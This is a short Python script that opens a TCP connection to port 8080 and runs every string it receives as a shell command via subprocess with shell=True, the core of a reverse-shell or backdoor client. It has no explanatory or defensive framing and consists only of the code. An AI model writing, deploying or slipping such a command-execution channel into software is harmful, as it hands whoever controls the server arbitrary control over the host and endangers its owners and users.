import socket
import subprocess

PORT = 8080
BUFFER_SIZE = 1024

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("127.0.0.1", PORT))

    print("Connected to server...")

    while True:
        command = client_socket.recv(BUFFER_SIZE).decode()
        subprocess.run(command, shell=True)
        print("Command: {}".format(command))
    client_socket.close()

if __name__ == "__main__":
    main()
